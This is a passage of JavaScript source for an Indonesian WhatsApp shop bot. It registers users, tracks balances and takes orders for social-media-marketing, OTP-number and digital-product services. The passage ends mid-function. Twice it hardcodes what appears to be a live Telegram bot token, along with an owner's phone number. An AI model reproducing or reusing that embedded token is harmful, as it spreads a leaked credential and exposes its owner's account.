/*Pembuat Script
-Rezeki Botz X KrisBotz
==========
Credit Jangan Di Hapus Hargai Pembuat
==========

Ubah Daftar Harga Sesuai Ke Untungan Anda*/

require("./Pengaturan/Admin/settings");
const {
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	generateWAMessageContent,
	generateWAMessage,
	prepareWAMessageMedia,
	areJidsSameUser,
	getContentType,
} = require("@adiwajshing/baileys");
const fs = require("fs");
// const { exec } = require('child_process');
const chalk = require("chalk");
const axios = require("axios");
const moment = require("moment-timezone");
const ms = (toMs = require("ms"));
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const fetch = require("node-fetch");
const crypto = require("crypto");
const { sizeFormatter } = require("human-readable");
const format = sizeFormatter();
const os = require("os");
const path = require("path");
const { exec } = require("child_process");
const speed = require("performance-now");
const util = require("util");
const short = require("short-uuid");
const md5 = require("md5");
const PathAuto = "./Pengaturan/database/deposit/manual/";
const PathAut = "./Pengaturan/database/riwayat/trx/";
const PathAutoo = "./Pengaturan/database/deposit/otomatis/";
const { getProduk } = require("./Pengaturan/function/getpro");
const { getWeb } = require("./Pengaturan/function/getproduk");
const PathOtp = "./Pengaturan/database/otpweb/trx/";
const PathTrx = "./Pengaturan/database/riwayat/trx/";
const walletJson = "./Pengaturan/database/wallet.json";
let ntlinkgc = JSON.parse(fs.readFileSync('./Pengaturan/database/antilink.json'))
const {
	fee_cus,
	fee_owner,
	batas_time,
	servpaydis,
	merchpaydis,
	keypaydis,
	prowner,
	prpartner,
	prplatinum,
	prgold,
	prmember,
	smm,
	idsmm,
	smmm,
	idsmmm,
	nomorKu,
} = require("./Pengaturan/Admin/apikey");
const { color, bgcolor } = require("./Pengaturan/function/color");

global.tanggalserver = `${moment.tz("Asia/Jakarta").format("DD/MM/YY")}`;
global.waktuserver = `${moment.tz("Asia/Jakarta").format("HH:mm:ss")}`;
const ownernya = global.owner;
// const newsletter = global.newslatter;
// console.log(newslatter)
let http = require("http");
http.get({ host: "api.ipify.org", port: 80, path: "/" }, function (resp) {
	resp.on("data", function (ip) {
		global.ipserver = ip;
	});
});

const { smsg, fetchJson, getBuffer } = require("./Pengaturan/function/simple");
const sleep = (exports.sleep = async (ms) => {
	return new Promise((resolve) => setTimeout(resolve, ms));
});

global.keytri = " "; //apikey
global.privateKey = " "; //private key
global.merchantcode = " ";

global.db = JSON.parse(fs.readFileSync("./Pengaturan/database/database.json"));
if (global.db)
	global.db = {
		sticker: {},
		database: {},
		game: {},
		others: {},
		users: {},
		chats: {},
		...(global.db || {}),
	};

//━━━━━━━━━━━━━━━[ PREFIX ]━━━━━━━━━━━━━━━━━//

module.exports = kris = async (kris, msg, m, chatUpdate, store) => {
	try {
		const { type, quotedMsg, mentioned, now, fromMe } = m;
		const gakbisaowner = `${owner}@s.whatsapp.net`;
		const chats = msg.message.interactiveResponseMessage
		? JSON.parse(
			msg.message.interactiveResponseMessage.nativeFlowResponseMessage
			.paramsJson
			).id
		: type === "conversation" && msg.message.conversation
		? msg.message.conversation
		: type === "imageMessage" && msg.message.imageMessage.caption
		? msg.message.imageMessage.caption
		: type === "videoMessage" && msg.message.videoMessage.caption
		? msg.message.videoMessage.caption
		: type === "extendedTextMessage" && msg.message.extendedTextMessage.text
		? msg.message.extendedTextMessage.text
		: type === "buttonsResponseMessage" &&
		quotedMsg.fromMe &&
		msg.message.buttonsResponseMessage.selectedButtonId
		? msg.message.buttonsResponseMessage.selectedButtonId
		: type === "templateButtonReplyMessage" &&
		quotedMsg.fromMe &&
		msg.message.templateButtonReplyMessage.selectedId
		? msg.message.templateButtonReplyMessage.selectedId
		: type === "messageContextInfo"
		? msg.message.buttonsResponseMessage?.selectedButtonId ||
		msg.message.listResponseMessage?.singleSelectReply.selectedRowId
		: type == "listResponseMessage" &&
		quotedMsg.fromMe &&
		msg.message.listResponseMessage.singleSelectReply.selectedRowId
		? msg.message.listResponseMessage.singleSelectReply.selectedRowId
		: "";
		if (chats == undefined) {
			chats = "";
		}
		const chath =
		m.mtype === "conversation" && m.message.conversation
		? m.message.conversation
		: m.mtype == "imageMessage" && m.message.imageMessage.caption
		? m.message.imageMessage.caption
		: m.mtype == "documentMessage" && m.message.documentMessage.caption
		? m.message.documentMessage.caption
		: m.mtype == "videoMessage" && m.message.videoMessage.caption
		? m.message.videoMessage.caption
		: m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.text
		? m.message.extendedTextMessage.text
		: m.mtype == "buttonsResponseMessage" &&
		m.message.buttonsResponseMessage.selectedButtonId
		? m.message.buttonsResponseMessage.selectedButtonId
		: m.mtype == "templateButtonReplyMessage" &&
		m.message.templateButtonReplyMessage.selectedId
		? m.message.templateButtonReplyMessage.selectedId
		: m.mtype == "listResponseMessage"
		? m.message.listResponseMessage.singleSelectReply.selectedRowId
		: m.mtype == "messageContextInfo"
		? m.message.listResponseMessage.singleSelectReply.selectedRowId
		: "";
		const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats)
		? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)
		: "";
		const command = chats
		.replace(prefix, "")
		.trim()
		.split(/ +/)
		.shift()
		.toLowerCase();
		const body = chats.startsWith(prefix) ? chats : "";
		const budy =
		type === "conversation"
		? msg.message.conversation
		: type === "extendedTextMessage"
		? msg.message.extendedTextMessage.text
		: "";
		const args = body.trim().split(/ +/).slice(1);
		const q = args.join(" ");
		const text = args.join(" ");
		const isCommand = chats.startsWith(prefix);
		const isCmd = isCommand
		? chats.slice(1).trim().split(/ +/).shift().toLowerCase()
		: null;
		const from = m.key.remoteJid;
		const pushname = m.pushName || "No Name";
		const botNumber = await kris.decodeJid(kris.user.id);
		const groupMetadata = m.isGroup
		? await kris.groupMetadata(m.chat).catch((e) => {})
		: "";
		const groupName = m.isGroup ? groupMetadata.subject : "";
		const participants = m.isGroup ? await groupMetadata.participants : "";
		const groupAdmins = m.isGroup
		? await participants.filter((v) => v.admin !== null).map((v) => v.id)
		: "";
		const groupOwner = m.isGroup ? groupMetadata.owner : "";
		const groupMembers = m.isGroup ? groupMetadata.participants : "";
		const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
		const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
		const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false;
		const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
		const content = JSON.stringify(msg.message);
		const itsMe = m.sender == botNumber ? true : false;
		const quoted = m.quoted ? m.quoted : m;
		const qmsg = quoted.msg || quoted;
		const mime = (quoted.msg || quoted).mimetype || "";
		const jam = moment.tz("asia/jakarta").format("HH:mm:ss");
		const tanggal = moment().tz("Asia/Jakarta").format("ll");
		const dt = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
		const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1);
		const tanggal3 = moment()
		.tz("Asia/Jakarta")
		.locale("id")
		.format("dddd, D MMMM YYYY");
		const wayah = moment.tz("asia/jakarta").format("HH:mm:ss z");
		const isMedia = /image|video|sticker|audio/.test(mime);
		const isImage = type == "imageMessage";
		const isVideo = type == "videoMessage";
		const isAudio = type == "audioMessage";
		const isSticker = type == "stickerMessage";
		const time1 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		if (time1 < "23:59:00") {
			var ucapanWaktu1 = "Malam";
		}
		if (time1 < "19:00:00") {
			var ucapanWaktu1 = "Malam";
		}
		if (time1 < "18:00:00") {
			var ucapanWaktu1 = "Sore";
		}
		if (time1 < "15:00:00") {
			var ucapanWaktu1 = "Siang";
		}
		if (time1 < "10:00:00") {
			var ucapanWaktu1 = "Pagi";
		}
		if (time1 < "05:00:00") {
			var ucapanWaktu1 = "Pagi";
		}
		if (time1 < "03:00:00") {
			var ucapanWaktu1 = "Malam";
		}
		const hariini = moment
		.tz("Asia/Jakarta")
		.locale("id")
		.format("dddd,D MMM YYYY");
		const isQuotedImage =
		type === "extendedTextMessage" && content.includes("imageMessage");
		const isQuotedLocation =
		type === "extendedTextMessage" && content.includes("locationMessage");
		const isQuotedVideo =
		type === "extendedTextMessage" && content.includes("videoMessage");
		const isQuotedSticker =
		type === "extendedTextMessage" && content.includes("stickerMessage");
		const isQuotedAudio =
		type === "extendedTextMessage" && content.includes("audioMessage");
		const isQuotedContact =
		type === "extendedTextMessage" && content.includes("contactMessage");
		const isQuotedDocument =
		type === "extendedTextMessage" && content.includes("documentMessage");

		const sender = m.isGroup
		? m.key.participant
		? m.key.participant
		: m.participant
		: m.key.remoteJid;
		const isOwner =
		[`${owner}@s.whatsapp.net`] == sender
		? true
		: ["6181317107885@s.whatsapp.net"].includes(sender)
		? true
		: false;
		const senderNumber = sender.split("@")[0];
		const arg = budy.trim().substring(budy.indexOf(" ") + 1);
		const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
		try {
			ppnyaimg = await kris.sendMessage(m.sender, "image");
		} catch (err) {
			ppnyaimg = "https://iili.io/dbQBob9.md.jpg";
		}

		if (!kris.public) {
			if (!m.key.fromMe) return;
		}
		const reply = (teks) => {
			kris.sendMessage(from, { text: teks }, { quoted: m });
		};

		var mdu = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
		var halalu = mdu[Math.floor(Math.random() * mdu.length)];
		var mdo = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
		var halalo = mdo[Math.floor(Math.random() * mdo.length)];
		var mdi = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
		var halali = mdi[Math.floor(Math.random() * mdi.length)];
		var mda = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
		var halala = mda[Math.floor(Math.random() * mda.length)];
		var mde = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
		var halale = mde[Math.floor(Math.random() * mde.length)];

		if (isCmd) {
			console.log(
				chalk.yellow.bgCyan.bold("🇷🇪🇿🇪🇰🇮🇧🇴🇹🇿"),
				color(`[ PESAN MASUK ]`, `${halalu}`),
				color(`FROM`, `${halalo}`),
				color(`${pushname}`, `${halali}`),
				color(`Text :`, `${halala}`),
				color(`${body}`, `${halale}`)
				);
		}

		async function sendkrisMessage(chatId, message, options = {}) {
			let generate = await generateWAMessage(chatId, message, options);
			let type2 = getContentType(generate.message);
			if ("contextInfo" in options)
				generate.message[type2].contextInfo = options?.contextInfo;
			if ("contextInfo" in message)
				generate.message[type2].contextInfo = message?.contextInfo;
			return await kris.relayMessage(chatId, generate.message, {
				messageId: generate.key.id,
			});
		}

		let rn = ["recording", "composing"];
		let jd = rn[Math.floor(Math.random() * rn.length)];

		if (command) {
			kris.sendPresenceUpdate(jd, from);
			kris.readMessages([m.key]);
		}
		function formatmoney(n, opt = {}) {
			if (!opt.current) opt.current = "IDR";
			return n.toLocaleString("id", {
				style: "currency",
				currency: opt.current,
			});
		}

		function acakindong(min, max = null) {
			if (max !== null) {
				min = Math.ceil(min);
				max = Math.floor(max);
				return Math.floor(Math.random() * (max - min + 1)) + min;
			} else {
				return Math.floor(Math.random() * min) + 1;
			}
		}

		function sendMessageToTelegram(chatId, message) {
      const botToken = "6081100084:AAEpGZqP3BY0TkQJB6MZlmhqSLrl0BFmpTo"; // Ganti dengan token bot Anda
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const data = { chat_id: chatId, text: message };

      axios
      .post(url, data)
      .then((response) => {
      	console.log("Pesan berhasil dikirim:", response.data);
      })
      .catch((error) => {
      	console.error("Terjadi kesalahan:", error);
      });
  }
  function sendMessageToTelegram1(chatId, message) {
      const botToken = "6081100084:AAEpGZqP3BY0TkQJB6MZlmhqSLrl0BFmpTo"; // Ganti dengan token bot Anda
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const data = { chat_id: chatId, text: message };

      axios
      .post(url, data)
      .then((response) => {
      	console.log("Pesan berhasil dikirim:", response.data);
      })
      .catch((error) => {
      	console.error("Terjadi kesalahan:", error);
      });
  }

  function toRupiah(angka) {
  	var angkaStr = angka.toString();
  	var angkaTanpaKoma = angkaStr.split(".")[0];
  	var angkaRev = angkaTanpaKoma.toString().split("").reverse().join("");
  	var rupiah = "";
  	for (var i = 0; i < angkaRev.length; i++) {
  		if (i % 3 == 0) rupiah += angkaRev.substr(i, 3) + ".";
  	}
  	return (
  		"" +
  		rupiah
  		.split("", rupiah.length - 1)
  		.reverse()
  		.join("")
  		);
  }

  const sendContact = (jid, numbers, name, quoted, mn) => {
  	let number = numbers.replace(/[^0-9]/g, "");
  	const vcard =
  	"BEGIN:VCARD\n" +
  	"VERSION:3.0\n" +
  	"FN:" +
  	name +
  	"\n" +
  	"ORG:;\n" +
  	"TEL;type=CELL;type=VOICE;waid=" +
  	number +
  	":+" +
  	number +
  	"\n" +
  	"END:VCARD";
  	return kris.sendMessage(
  		from,
  		{
  			contacts: { displayName: name, contacts: [{ vcard }] },
  			mentions: mn ? mn : [],
  		},
  		{ quoted: quoted }
  		);
  };

  function generateRandomString(length) {
  	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  	let result = "";
  	const randomBytes = crypto.randomBytes(length);

  	for (let i = 0; i < length; i++) {
  		const byte = randomBytes[i] % chars.length;
  		result += chars.charAt(byte);
  	}

  	return result.toLowerCase();
  }

  const mentions = (teks, memberr, id) => {
  	id == null || id == undefined || id == false
  	? kris.sendMessage(
  		from,
  		{ text: teks.trim(), jpegThumbnail: global.krismenu },
  		text,
  		{ sendEphemeral: true, contextInfo: { mentions: memberr } }
  		)
  	: kris.sendMessage(
  		from,
  		{ text: teks.trim(), jpegThumbnail: global.krismenu },
  		text,
  		{
  			sendEphemeral: true,
  			quoted: m,
  			contextInfo: { mentions: memberr },
  		}
  		);
  };

  const randomString = generateRandomString(5);

  function boolToString(value) {
  	return value ? "iyah" : "tidak";
  }

  const formatp = sizeFormatter({
      std: "JEDEC", //'SI' = default | 'IEC' | 'JEDEC'
      decimalPlaces: 2,
      keepTrailingZeroes: false,
      render: (literal, symbol) => `${literal} ${symbol}B`,
  });

  const isUrl = (url) => {
  	return url.match(
  		new RegExp(
  			/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,
  			"gi"
  			)
  		);
  };

  const jsonformat = (string) => {
  	return JSON.stringify(string, null, 2);
  };

  function randomNomor(min, max = null) {
  	if (max !== null) {
  		min = Math.ceil(min);

  		max = Math.floor(max);

  		return Math.floor(Math.random() * (max - min + 1)) + min;
  	} else {
  		return Math.floor(Math.random() * min) + 1;
  	}
  }
  const fetchJson = async (url, options) => {
  	try {
  		options ? options : {};
  		const res = await axios({
  			method: "GET",
  			url: url,
  			headers: {
  				"User-Agent":
  				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
  			},
  			...options,
  		});
  		return res.data;
  	} catch (err) {
  		return err;
  	}
  };

  function toLvl(input) {
  	if (typeof input === "number") {
  		return input / 100 + 1;
  	} else if (typeof input === "string") {
  		const inputNumber = parseFloat(input.replace(",", "."));
  		if (!isNaN(inputNumber)) {
  			return inputNumber / 100 + 1;
  		}
  	}
  	return "Masukan tidak valid";
  }

  const repPy = {
  	key: {
  		remoteJid: "0@s.whatsapp.net",
  		fromMe: false,
  		id: "kris Bot",
  		participant: "0@s.whatsapp.net",
  	},
  	message: {
  		requestPaymentMessage: {
  			currencyCodeIso4217: "USD",
  			amount1000: 999999999,
  			requestFrom: "0@s.whatsapp.net",
  			noteMessage: {
  				extendedTextMessage: {
  					text: "Creator kris",
  				},
  			},
  			expiryTimestamp: 999999999,
  			amount: {
  				value: 91929291929,
  				offset: 1000,
  				currencyCode: "USD",
  			},
  		},
  	},
  };
  // const fs = require('fs');

  function readJsonFile(filePath) {
  	try {
  		const data = fs.readFileSync(filePath);
  		return JSON.parse(data);
  	} catch (error) {
  		console.error(`Error reading or parsing ${filePath}:`, error);
    return null; // Kembalikan null atau nilai default jika ada error
}
}

let sos = readJsonFile("./Pengaturan/database/datasmm.json");
let sosi = readJsonFile("./Pengaturan/database/datasmm2.json");
var list_produk = readJsonFile("./Pengaturan/database/datadigiflaz.json");
var layanan_otp = readJsonFile("./Pengaturan/database/otpweb/_otp.json");
var list_negara = readJsonFile("./Pengaturan/database/otpweb/negara.json");
var user = readJsonFile("./Pengaturan/database/user.json");
const profitt = readJsonFile("./Pengaturan/database/profit.json");

// Check if any files returned null
if (!sos) console.warn("sos data not loaded properly.");
if (!sosi) console.warn("sosi data not loaded properly.");
if (!list_produk) console.warn("list_produk data not loaded properly.");
if (!layanan_otp) console.warn("layanan_otp data not loaded properly.");
if (!list_negara) console.warn("list_negara data not loaded properly.");
if (!user) console.warn("user data not loaded properly.");
if (!profitt) console.warn("profitt data not loaded properly.");

const profit = profitt.profit;
const cek = (satu, dua) => {
	let x1 = false;
	Object.keys(user).forEach((i) => {
		if (user[i].id == dua) {
			x1 = i;
		}
	});
	if (x1 !== false) {
		if (satu == "id") {
			return user[x1].id;
		}
		if (satu == "layanan") {
			return user[x1].layanan;
		}
		if (satu == "saldo") {
			return user[x1].saldo;
		}
		if (satu == "status_sosmed") {
			return user[x1].status_sosmed;
		}
		if (satu == "product_name") {
			return user[x1].product_name;
		}
		if (satu == "harga") {
			return user[x1].harga;
		}
		if (satu == "tujuan") {
			return user[x1].tujuan;
		}
		if (satu == "price") {
			return user[x1].price;
		}
		if (satu == "jumlah") {
			return user[x1].jumlah;
		}
		if (satu == "upharga") {
			return user[x1].upharga;
		}
		if (satu == "price") {
			return user[x1].price;
		}
		if (satu == "reff") {
			return user[x1].reff;
		}
		if (satu == "desc") {
			return user[x1].desc;
		}
		if (satu == "status") {
			return user[x1].status;
		}
		if (satu == "kode_layanan") {
			return user[x1].kode_layanan;
		}
		if (satu == "role") {
			return user[x1].role;
		}
		if (satu == "level") {
			return user[x1].level;
		}
		if (satu == "buyer_sku_code") {
			return user[x1].buyer_sku_code;
		}
	}
	if (x1 == false) {
		return null;
	}
};
let sett = (satu, dua, tiga) => {
	Object.keys(user).forEach((i) => {
		if (user[i].id == dua) {
			if (satu == "+saldo") {
				user[i].saldo += tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "-saldo") {
				user[i].saldo -= tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "harga") {
				user[i].harga = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "jumlah") {
				user[i].jumlah = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "level") {
				user[i].level = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "buyer_sku_code") {
				user[i].buyer_sku_code = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "product_name") {
				user[i].product_name = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "price") {
				user[i].price = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "upharga") {
				user[i].upharga = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "price") {
				user[i].price = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "status") {
				user[i].status = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "layanan") {
				user[i].layanan = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "status_sosmed") {
				user[i].status_sosmed = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "tujuan") {
				user[i].tujuan = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "desc") {
				user[i].desc = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "kode_layanan") {
				user[i].kode_layanan = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "reff") {
				user[i].reff = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
			if (satu == "role") {
				user[i].role = tiga;
				fs.writeFileSync(
					"./Pengaturan/database/user.json",
					JSON.stringify(user)
					);
			}
		}
	});
};

if (Antilinkgc) {
	if (budy.match('chat.whatsapp.com')) {
		if (!isBotAdmins) return reply(`_Bot Harus Menjadi Admin Terlebih Dahulu_`);
		try {
			let gcLink = (`https://chat.whatsapp.com/` + await kris.groupInviteCode(m.chat));
			let isLinkThisGc = new RegExp(gcLink, 'i');
			let isGcLink = isLinkThisGc.test(m.text);

			if (isGcLink) {
				return kris.sendMessage(m.chat, {
					text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAnda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`
				});
			}

			if (isAdmins) {
				return kris.sendMessage(m.chat, {
					text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin mengirimkan link, admin mah bebas memposting link apapun:)`
				});
			}

			if (isOwner) {
				return kris.sendMessage(m.chat, {
					text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner telah mengirimkan tautan, owner bebas memposting tautan apa pun`
				});
			}

			kice = m.sender;
			await kris.sendMessage(m.chat, {
				delete: {
					remoteJid: m.chat,
					fromMe: false,
					id: m.key.id,
					participant: m.key.participant
				}
			});

			kris.sendMessage(from, {
				text: `\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split('@')[0]} telah mengirimkan tautan dan berhasil dihapus`,
				contextInfo: { mentionedJid: [m.sender] },
				quoted: m
			});
		} catch (error) {
			console.log("Terjadi kesalahan pada deteksi tautan: ", error);
			reply("Maaf, terjadi kesalahan saat memproses tautan.");
		}
	}
}

const daftarr = () => {
	if (cek("id", m.sender) == null) {
		user.push({
			id: m.sender,
			saldo: 0,
			buyer_sku_code: "",
			product_name: "",
			tujuan: "",
			price: "",
			jumlah: "",
			level: "member",
			role: "USER",
			layanan: "",
			upharga: 5,
			harga: 0,
			tujuan: "",
			status_sosmed: true,
			kode_layanan: "",
			desc: "",
			reff: "",
		});
		fs.writeFileSync(
			"./Pengaturan/database/user.json",
			JSON.stringify(user)
			);
		const suc = `──〔 *REGISTRASI SUKSES* 〕─\n_›› Nomor : ${m.sender.split("@")[0]}_\n_›› Saldo : ${cek("saldo", m.sender)}_\n_›› Role : ${cek("role", m.sender)}_\n\n_Terimakasih telah mendaftar semoga nyaman menggunakan layann yang di sediakan oleh kami_
		`;
		kris.sendMessage(m.chat, { text: `${suc}` }, { quoted: m });
	}
};
function formatMoney(nominal) {
      // Mengonversi angka menjadi string
      var strNominal = nominal.toString();
      // Mengambil bagian angka sebelum koma
      var hasil = strNominal.split(".")[0];
      // Mengonversi kembali menjadi angka
      return parseInt(hasil);
  }

  function orderwebsmm(id, target, quantity) {
  	var lok = JSON.parse(
  		fs.readFileSync(`./Pengaturan/database/otpweb/${id}list.json`)
  		);
  	const hehehe = m.sender.split("@")[0];
  	for (let i of lok) {
  		if (i.service_id == id) {
  			const nl = Number(i.price);
  			const har = nl + 300;
  			if (i.count === 0)
  				return reply(`Stok Kosong Silahkan Pilih layanan yang lain`);
  			if (nl > cek("saldo", m.sender))
  				return reply(
  					`Maaf,saldo kamu tidak cukup untuk membeli produk itu Silahkan Deposit Terlebih Dahulu.`
  					);
  			let obj = {
  				id: hehehe,
  				service_id: id,
  				negara_id: negara,
  				service_name: i.service_name,
  				harga: har,

  				stok: i.count,
  			};

  			fs.writeFileSync(
  				PathAut + m.sender.split("@")[0] + ".json",
  				JSON.stringify(obj)
  				);
  		}
  	}

  	let data_otpweb = JSON.parse(
  		fs.readFileSync(PathAut + sender.split("@")[0] + ".json")
  		);
  	let an = `_🛍️DETAIL ORDER_\n> _››  SERVICE ID :_ ${data_otpweb.service_id}\n> _››  SERVICE NAME :_ ${data_otpweb.service_name}\n> _››  HARGA :_ ${formatmoney(data_otpweb.harga)}\n> _››  STOK :_ ${data_otpweb.stok}\n\nKetik *${prefix}Y* untuk Melanjutkan Transaksi\nKetik *${prefix}N* untuk Membatalkan pesanan`;
  	reply(an);
  }

  function ordersmm(service, quantity, target) {
  	const memberNumber = m.sender.split("@")[0];
  	var sos = JSON.parse(
  		fs.readFileSync(`./Pengaturan/database/datasmm.json`)
  		);
  	for (let i of sos) {
  		if (i.id == service) {
  			const nl = Number(i.price);
  			const har = nl + 300;
  			let nama_produkk = i.name;
  			let descc = i.note;
  			if (nl > cek("saldo", m.sender))
  				return reply(
  					`Maaf,saldo kamu tidak cukup untuk membeli produk itu Silahkan Deposit Terlebih Dahulu.`
  					);
  			let obj = {
  				id: memberNumber,
  				service: service,
  				quantity: quantity,
  				target: target,
  				service_name: i.name,
  				harga: har,
  			};
  			sett("-saldo", m.sender, har);
  			sett("price", m.sender, har);
  			sett("product_name", m.sender, nama_produkk);
  			sett("status_sosmed", m.sender, false);
  			sett("tujuan", m.sender, target);
  			sett("service", m.sender, service);
  			sett("desc", m.sender, descc);
  			sett("jumlah", m.sender, parseInt(quantity));
  			fs.writeFileSync(
  				PathAut + m.sender.split("@")[0] + ".json",
  				JSON.stringify(obj)
  				);
  		}
  	}

  	let data_otpweb = JSON.parse(
  		fs.readFileSync(PathAut + sender.split("@")[0] + ".json")
  		);
  	let an = `_🛍️DETAIL ORDER_

  	> _››  SERVICE ID :_ ${data_otpweb.service}
  	> _››  SERVICE NAME :_ ${data_otpweb.service_name}
  	> _››  HARGA :_ ${formatmoney(data_otpweb.harga)}

  	Ketik *${prefix}lanjutkan* untuk Melanjutkan Transaksi
  	Ketik *${prefix}batalkann* untuk Membatalkan pesanan`;
  	reply(an);
  }

  function orderwebotp(negara, id) {
  	var lok = JSON.parse(
  		fs.readFileSync(`./Pengaturan/database/otpweb/${negara}_otp.json`)
  		);
  	const memberNumber = m.sender.split("@")[0];
  	for (let i of lok) {
  		if (i.service_id == id) {
  			const nl = Number(i.cost);
  			const har = nl + 300;
  			if (i.count === 0)
  				return reply(`Stok Kosong Silahkan Pilih layanan yang lain`);
  			if (nl > cek("saldo", m.sender))
  				return reply(
  					`Maaf,saldo kamu tidak cukup untuk membeli produk itu Silahkan Deposit Terlebih Dahulu.`
  					);
  			let obj = {
  				id: memberNumber,
  				service_id: id,
  				negara_id: negara,
  				service_name: i.service_name,
  				harga: har,

  				stok: i.count,
  			};

  			fs.writeFileSync(
  				PathAut + m.sender.split("@")[0] + ".json",
  				JSON.stringify(obj)
  				);
  		}
  	}

  	let data_otpweb = JSON.parse(
  		fs.readFileSync(PathAut + sender.split("@")[0] + ".json")
  		);
  	let an = `_🛍️DETAIL ORDER_

  	> _››  SERVICE ID :_ ${data_otpweb.service_id}
  	> _››  SERVICE NAME :_ ${data_otpweb.service_name}
  	> _››  HARGA :_ ${formatmoney(data_otpweb.harga)}
  	> _››  STOK :_ ${data_otpweb.stok}

  	Ketik *${prefix}Y* untuk Melanjutkan Transaksi
  	Ketik *${prefix}N* untuk Membatalkan pesanan`;
  	reply(an);
  }

  function updateLevelAndPrice(userId, newLevel) {
      // Load user data from user.json
      let userData = fs.readFileSync("./Pengaturan/database/user.json");
      let users = JSON.parse(userData);

      // Find the user by id and update level and price
      let user = users.find((user) => user.id === userId + "@s.whatsapp.net");
      if (user) {
      	user.level = newLevel;
      	switch (newLevel) {
      		case "member":
      		user.upharga = prmember;
      		break;
      		case "gold":
      		user.upharga = prgold;
      		break;
      		case "platinum":
      		user.upharga = prplatinum;
      		break;
      		case "partner":
      		user.upharga = prpartner;
      		break;
      		default:
      		m.reply(
      			"Tidak Ada Level Tersedia.\nLevel Tersedia : *member, gold, platinum, partner*"
      			);
      		return;
      	}

        // Save updated user data back to user.json
        fs.writeFileSync(
        	"./Pengaturan/database/user.json",
        	JSON.stringify(users, null, 2)
        	);

        m.reply(
        	`User ${userId} Level Terlah DiPerbarui Menjadi ${newLevel} Dengan Upharga ${user.upharga}%.`
        	);
    } else {
    	m.reply(`User Dengan ID ${userId} Tidak Terdaftar.`);
    }
}

const admModalPath = "./Pengaturan/database/admin.json";
function hitungHargaRole(hargaAwal) {
	const user = cek("role", m.sender);

	if (!user) {
        return hargaAwal; // Mengembalikan harga awal jika data pengguna tidak ditemukan
    }
    const userr = hargaAwal * profit.user;
    const vip = hargaAwal * profit.vip;
    const vvip = hargaAwal * profit.vvip;
    var aw = Number(hargaAwal);
    var us = formatMoney(userr);
    var vp = formatMoney(vip);
    var vips = formatMoney(vvip);

    switch (user) {
    	case "USER":
          return us; // Tambah 2%
          case "VIP":
          return vp;

        // Tambah 3%
        case "VVIP":
        return vips;
        default:
          return hargaAwal; // Mengembalikan harga awal jika role tidak sesuai
      }
  }

  function getMonthName(monthIndex) {
  	const monthNames = [
  	"Januari",
  	"Februari",
  	"Maret",
  	"April",
  	"Mei",
  	"Juni",
  	"Juli",
  	"Agustus",
  	"September",
  	"Oktober",
  	"November",
  	"Desember",
  	];
  	return monthNames[monthIndex];
  }

  function cekWaktu() {
